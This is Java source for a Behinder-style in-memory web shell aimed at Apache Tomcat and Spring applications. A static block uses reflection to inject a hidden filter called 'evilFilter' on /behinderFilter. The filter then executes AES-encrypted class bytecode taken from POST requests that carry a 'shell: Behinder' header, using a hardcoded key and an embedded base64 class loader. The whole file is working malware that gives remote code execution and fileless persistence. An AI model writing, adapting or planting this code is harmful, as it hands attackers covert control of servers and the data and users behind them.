import org.apache.catalina.Container;
import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class BehinderFilterShell implements Filter {

    private final String pa = "2028ea0825d3605d";

    static{
        try{
            ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
            HttpServletRequest request = attributes.getRequest();
            ServletContext servletContext = request.getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext= (ApplicationContext)appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
            BehinderFilterShell filter = new BehinderFilterShell();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName("evilFilter");
            filterDef.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(filterDef);
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
            Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            Map filterConfigs = (Map) filterConfigsField.get(standardContext);
            filterConfigs.put("evilFilter", filterConfig);
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/behinderFilter");
            filterMap.setFilterName("evilFilter");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(filterMap);
        }catch (Exception e){
            e.printStackTrace();
        }
    }



    public BehinderFilterShell(){

    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        String shell = request.getHeader("shell");
        if (shell.equals("Behinder")) {
            HttpSession session = request.getSession();
            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);
            ClassLoader loader = (ClassLoader) Thread.currentThread().getContextClassLoader();
            response.setStatus(HttpServletResponse.SC_OK);
            if (request.getMethod().equals("POST")) {
                if (loader.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else if (loader.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else {
                    if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    } else if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    } else if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    } else {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    }
                }
            }
        }
        chain.doFilter(request,response);
    }

    @Override
    public void destroy() {

    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext) {
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            java.lang.reflect.Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class); //获取g函数
            Um.setAccessible(true);
            String k = pa;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
